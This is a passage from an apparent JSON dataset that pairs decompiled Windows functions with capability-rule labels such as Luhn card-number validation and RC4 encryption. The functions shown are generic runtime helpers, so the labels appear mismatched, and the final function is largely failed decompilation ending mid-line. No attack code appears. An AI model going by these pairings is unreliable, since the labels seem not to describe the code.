            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400811c0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    uint32_t uStack68;\n    \n    iVar7 = 100;\n    do {\n        uVar1 = rdrand();\n        bVar8 = rdrandIsValid();\n        uVar2 = uVar1;\n        if (bVar8) {\n            uVar2 = 1;\n        }\n        if (uVar2 != 0) {\n            return uVar1;\n        }\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    pcVar6 = \"random_device: rdrand failed\";\n    fcn.1400bd400(\"random_device: rdrand failed\");\n    uStack68 = rdseed();\n    bVar8 = rdseedIsValid();\n    if (bVar8) {\ncode_r0x000140081220:\n        uVar3 = uStack68;\n    }\n    else {\n        iVar7 = 99;\n        do {\n            uStack68 = rdseed();\n            bVar8 = rdseedIsValid();\n            if (bVar8) goto code_r0x000140081220;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n        if (pcVar6 == NULL) {\n            fcn.1400bd400(\"random_device: rdseed failed\");\n            uVar4 = sub.msvcrt.dll_setlocale(0, 0);\n            iVar5 = sub.msvcrt.dll_strlen(uVar4);\n            uVar3 = fcn.1400bc6f0(iVar5 + 1);\n            if (uVar3 != 0) {\n                sub.msvcrt.dll_memcpy(uVar3, uVar4, iVar5 + 1);\n                sub.msvcrt.dll_setlocale(0, 0x14010e060);\n            }\n            return uVar3;\n        }\n        uVar3 = (*pcVar6)(0);\n    }\n    return uVar3;\n}\n",
        "token_count": 476
    },
    "14008127": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140081270(void)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    iVar3 = fcn.1400bc6f0(iVar2 + 1);\n    if (iVar3 != 0) {\n        sub.msvcrt.dll_memcpy(iVar3, uVar1, iVar2 + 1);\n        sub.msvcrt.dll_setlocale(0, 0x14010e060);\n    }\n    return iVar3;\n}\n",
        "token_count": 144
    },
    "14008214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140082140(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.msvcrt.dll__fileno_1(*arg1);\n    fcn.140015a40(uVar1, arg2, arg3);\n    return;\n}\n",
        "token_count": 71
    },
    "14008235": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140082350(ulong arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint16_t uStack82;\n    int64_t iStack64;\n    \n    uVar1 = fcn.140081eb0(arg1);\n    iVar2 = (*_sym.imp.msvcrt.dll__fstat64)(uVar1);\n    if ((iVar2 == 0) && ((uStack82 & 0xf000) == 0x8000)) {\n        uVar1 = fcn.140081eb0(arg1);\n        iVar3 = fcn.140015a40(uVar1, 0, 1);\n        return iStack64 - iVar3;\n    }\n    return 0;\n}\n",
        "token_count": 170
    },
    "140082c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140082c60(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110460 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140110480 + 0x10;\n    return;\n}\n",
        "token_count": 138
    },
    "140082e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140082e50(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110460 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140110490 + 0x10;\n    return;\n}\n",
        "token_count": 138
    },
    "14008304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140083040(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110460 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x1401104a0 + 0x10;\n    return;\n}\n",
        "token_count": 139
    },
    "1400838c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x000140083b98) overlaps instruction at (ram,0x000140083b94)\n// \n// WARNING: Removing unreachable block (ram,0x00014010ab90)\n\nchar * fcn.1400838c0(char *arg1, ulong noname_1, uint8_t **arg3)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    uint8_t uVar7;\n    char cVar8;\n    uint8_t uVar15;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint8_t *puVar11;\n    ulong *puVar12;\n    char *pcVar13;\n    uint64_t uVar16;\n    uint64_t uVar17;\n    char cVar18;\n    uint **ppuVar20;\n    uint **ppuVar21;\n    char **ppcVar22;\n    char **ppcVar23;\n    char **ppcVar26;\n    uint64_t unaff_RBP;\n    uchar *puVar27;\n    uint8_t *unaff_RSI;\n    uint8_t *puVar28;\n    int32_t iVar29;\n    uint *unaff_RDI;\n    uint *puVar30;\n    uint *puVar31;\n    ulong *in_R9;\n    ulong in_R11;\n    int64_t in_FS_OFFSET;\n    int64_t in_GS_OFFSET;\n    uint8_t uVar32;\n    bool bVar33;\n    bool bVar34;\n    bool bVar35;\n    bool bVar36;\n    ulong in_XMM1_Qa;\n    ulong *in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint8_t in_stack_00000048;\n    uint *puStack104;\n    uchar auStack96 [56];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    uint8_t *puVar14;\n    ushort uVar19;\n    char **ppcVar24;\n    char **ppcVar25;\n    \n    ppuVar21 = &puStack104;\n    uStack24 = *in_R9;\n    uStack16 = in_R9[1];\n    uStack40 = *in_stack_00000028;\n    uStack32 = in_stack_00000028[1];\n    uVar16 = 0x14010a8c8;\n    uVar9 = in_stack_00000048 - 100 & 0xff;\n    uVar10 = *(uVar9 * 4 + 0x14010a8c8);\n    uVar32 = 0xfffffffebfef5737 < uVar10;\n    puVar11 = uVar10 + 0x14010a8c8;\n    uVar7 = puVar11;\n    puVar30 = unaff_RDI;\n    // switch table (44 cases) at 0x14010a8c8\n    switch(uVar9) {\n    case 0:\n        (**(*arg3 + 0x20))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    default:\n        (**(*arg3 + 0x38))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 9:\n        (**(*arg3 + 0x30))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x10:\n        (**(*arg3 + 0x18))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x13:\n        (**(*arg3 + 0x28))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x16:\n        goto code_r0x000140083bf8;\n    case 0x17:\n    case 0x18:\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x27:\n    case 0x28:\n    case 0x2a:\n    case 0x2b:\n        goto code_r0x000140083c28;\n    case 0x1f:\n        goto code_r0x000140083bc8;\n    case 0x26:\n        puVar30 = unaff_RDI + 1;\n        uVar3 = in(arg3);\n        *unaff_RDI = uVar3;\n        *puVar11 = *puVar11 | uVar7;\n        break;\n    case 0x29:\n        break;\n    case 0x2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x32:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x34:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0xa7:\n    case 0xa8:\n    case 0xa9:\n        uVar9 = func_0x00015910a05d(uStack40, in_XMM1_Qa, uStack24);\n        uVar17 = uVar9;\n        iVar29 = unaff_RDI;\n        uVar10 = arg3 << 0x20 | uVar16 & 0xffffffff;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6ee70009;\n        uVar15 = uVar16;\n        uVar7 = *puVar11 - uVar15;\n        bVar33 = *puVar11 < uVar15 || uVar7 < uVar32;\n        *puVar11 = uVar7 - uVar32;\n        uVar10 = uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6ee70009;\n        uVar32 = uVar16;\n        uVar7 = *puVar11 - uVar32;\n        bVar34 = *puVar11 < uVar32 || uVar7 < bVar33;\n        *puVar11 = uVar7 - bVar33;\n        uVar10 = uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6ee70009;\n        uVar32 = uVar16;\n        uVar7 = *puVar11 - uVar32;\n        bVar33 = *puVar11 < uVar32 || uVar7 < bVar34;\n        *puVar11 = uVar7 - bVar34;\n        uVar10 = uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6f470009;\n        uVar32 = uVar16;\n        uVar7 = *puVar11 - uVar32;\n        bVar34 = *puVar11 < uVar32 || uVar7 < bVar33;\n        *puVar11 = uVar7 - bVar33;\n        uVar10 = uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6ee70009;\n        uVar32 = uVar16;\n        uVar7 = *puVar11 - uVar32;\n        bVar33 = *puVar11 < uVar32 || uVar7 < bVar34;\n        *puVar11 = uVar7 - bVar34;\n        uVar10 = uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6ee70009;\n        uVar32 = uVar16;\n        uVar7 = *puVar11 - uVar32;\n        bVar34 = *puVar11 < uVar32 || uVar7 < bVar33;\n        *puVar11 = uVar7 - bVar33;\n        uVar10 = uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6ee70009;\n        uVar32 = uVar16;\n        uVar7 = *puVar11 - uVar32;\n        bVar33 = *puVar11 < uVar32 || uVar7 < bVar34;\n        *puVar11 = uVar7 - bVar34;\n        uVar10 = uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 / iVar29 & 0xffffffff;\n        uVar10 = uVar10 % iVar29 & 0xffffffff;\n        *(uVar16 - 0x6ee70009) = uVar10;\n        uVar16 = uVar10 << 0x20 | uVar16;\n        uVar10 = uVar16 % iVar29 & 0xffffffff;\n        puVar11 = uVar17 - 0x6fa70009;\n        uVar7 = *puVar11;\n        uVar15 = uVar10;\n        uVar32 = *puVar11 - uVar15;\n        *puVar11 = uVar32 - bVar33;\n        uVar10 = uVar10 << 0x20 | uVar16 / iVar29 & 0xffffffffU;\n        uVar16 = uVar10 % iVar29 & 0xffffffff;\n        *(uVar17 - 0x6ee70009) = (*(uVar17 - 0x6ee70009) - uVar16) - (uVar7 < uVar15 || uVar32 < bVar33);\n        in_stack_00000030 = (uVar16 << 0x20 | uVar10 / iVar29 & 0xffffffffU) % iVar29 & 0xffffffff;\n        goto code_r0x00014010a920;\n    case 0x3a:\n    case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    case 0xab:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    case 0xac:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    case 0x4e:\n    case 0xad:\n    case 0xbe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    case 0x4f:\n    case 0xae:\n    case 0xbf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    case 0x50:\n    case 0xaf:\n    case 0xc0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x43:\n    case 0xb3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x44:\n    case 0xb4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x45:\n    case 0xb5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    case 0xb7:\n        *puVar11 = *puVar11 + uVar7;\n        *(unaff_RBP + 0x14010cf) = *(unaff_RBP + 0x14010cf) + arg3;\n        *puVar11 = *puVar11 + uVar7;\n        cVar8 = arg1;\n        *(uVar10 + 0x14150b997) = *(uVar10 + 0x14150b997) + cVar8;\n        *puVar11 = *puVar11 + uVar7;\n        *arg3 = *arg3 + uVar7;\n        *puVar11 = *puVar11 + uVar7;\n        *arg3 = *arg3 + uVar7;\n        *puVar11 = *puVar11 + uVar7;\n        arg1[0x14010cf] = arg1[0x14010cf] + cVar8;\n        *puVar11 = *puVar11 + uVar7;\n        unaff_RSI[0x14010cf] = unaff_RSI[0x14010cf] + cVar8;\n        *puVar11 = *puVar11 + uVar7;\n        *unaff_RSI = *unaff_RSI + uVar7;\n        *puVar11 = *puVar11 + uVar7;\n        *arg1 = *arg1 + uVar7;\n        *puVar11 = *puVar11 + uVar7;\n        *(unaff_RBP + 0x14010cf) = *(unaff_RBP + 0x14010cf) + (puVar11 >> 8);\n        *puVar11 = *puVar11 + uVar7;\n        *(uVar10 + 0x14150b997) = *(uVar10 + 0x14150b997) + -0x58;\n        *puVar11 = *puVar11 + uVar7;\n        *0x14010a8c8 = *0x14010a8c8 + -0x38;\n        *puVar11 = *puVar11 + uVar7;\n        *0x14010a8c8 = *0x14010a8c8 + uVar7;\n        *puVar11 = *puVar11 + uVar7;\n        cVar8 = arg3 >> 8;\n        *(arg3 + 0x14010cf) = *(arg3 + 0x14010cf) + cVar8;\n        *puVar11 = *puVar11 + uVar7;\n        *(unaff_RBP + 0x14010cf) = *(unaff_RBP + 0x14010cf) + cVar8;\n        goto code_r0x00014010d295;\n    case 0x48:\n    case 0x59:\n    case 0x7b:\n    case 0x86:\n    case 0x9b:\n    case 0xb8:\n    case 0xc9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    case 0x5a:\n    case 0x7c:\n    case 0x87:\n    case 0x9c:\n    case 0xb9:\n    case 0xca:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    case 0x5b:\n    case 0x7d:\n    case 0x88:\n    case 0x9d:\n    case 0xba:\n    case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    case 0xbd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x53:\n    case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x54:\n    case 0xc4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x55:\n    case 0xc5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x56:\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x57:\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x58:\n    case 200:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    case 0x96:\n    case 0xa2:\n    case 0xce:\n    case 0xeb:\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    case 0x97:\n    case 0xa3:\n    case 0xcf:\n    case 0xec:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    case 0x98:\n    case 0xa4:\n    case 0xd0:\n    case 0xed:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    case 0xd1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    case 0x69:\n    case 0x6e:\n    case 0x80:\n    case 0xd3:\n    case 0xd9:\n    case 0xde:\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    case 0x6a:\n    case 0x6f:\n    case 0x81:\n    case 0xd4:\n    case 0xda:\n    case 0xdf:\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x65:\n    case 0x6b:\n    case 0x70:\n    case 0x82:\n    case 0xd5:\n    case 0xdb:\n    case 0xe0:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x66:\n    case 0x71:\n    case 0xd6:\n    case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x67:\n    case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6c:\n    case 0xdc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6d:\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x72:\n    case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x73:\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    case 0x91:\n    case 0x9f:\n    case 0xe6:\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    case 0x92:\n    case 0xa0:\n    case 0xe7:\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    case 0x93:\n    case 0xe8:\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x83:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x84:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x85:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x89:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x94:\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x95:\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x99:\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9a:\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xa1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar12 = puVar11 & 0xffffffffffffff90;\n    *puVar12 = *puVar12 + puVar12;\n    uStack40 = *puVar12;\n    arg1 = 0x14010a8c8;\n    uVar16 = 0x14010a920;\n    uVar9 = in_stack_00000048 - 100 & 0xff;\n    uVar10 = *(uVar9 * 4 + 0x14010a920);\n    uStack32 = puVar12[1];\n    puVar11 = uVar10 + 0x14010a920;\n    arg3 = in_stack_00000030;\n    // switch table (22 cases) at 0x14010a920\n    switch(uVar9) {\n    case 0:\n        (**(*in_stack_00000030 + 0x20))\n                  (uStack40, in_XMM1_Qa, uStack24, 0x14010a8c8, in_stack_00000030, &uStack24, &uStack40);\n        return 0x14010a8c8;\n    default:\n        (**(*in_stack_00000030 + 0x38))\n                  (uStack40, in_XMM1_Qa, uStack24, 0x14010a8c8, in_stack_00000030, &uStack24, &uStack40);\n        return 0x14010a8c8;\n    case 9:\n        puVar11 = *in_stack_00000030;\ncode_r0x000140083c28:\n        (**(puVar11 + 0x30))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x10:\n        puVar11 = *in_stack_00000030;\ncode_r0x000140083bf8:\n        (**(puVar11 + 0x18))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x13:\n        puVar11 = *in_stack_00000030;\ncode_r0x000140083bc8:\n        (**(puVar11 + 0x28))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x18:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x91:\n    case 0x92:\n    case 0x93:\ncode_r0x00014010a920:\n        arg1[-0x6c9f0009] = arg1[-0x6c9f0009] ^ in_stack_00000030;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x24:\n    case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x25:\n    case 0x95:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x26:\n    case 0x96:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x27:\n    case 0x38:\n    case 0x97:\n    case 0xa8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x28:\n    case 0x39:\n    case 0x98:\n    case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x29:\n    case 0x3a:\n    case 0x99:\n    case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2a:\n    case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b:\n    case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2c:\n    case 0x9c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    case 0xa0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    case 0xa1:\ncode_r0x00014010d295:\n        cVar8 = puVar11;\n        *puVar11 = *puVar11 + cVar8;\n        *(puVar11 * 2) = *(puVar11 * 2) + uVar16;\n        *puVar11 = *puVar11 + cVar8;\n        pcVar13 = puVar11 & 0xffffffffffffff00 | cVar8 + *puVar11;\n        *pcVar13 = *pcVar13 + cVar8 + *puVar11;\n        return pcVar13;\n    case 0x32:\n    case 0x43:\n    case 0x65:\n    case 0x70:\n    case 0x85:\n    case 0xa2:\n    case 0xb3:\n    case 0xea:\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    case 0x44:\n    case 0x66:\n    case 0x71:\n    case 0x86:\n    case 0xa3:\n    case 0xb4:\n    case 0xeb:\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control 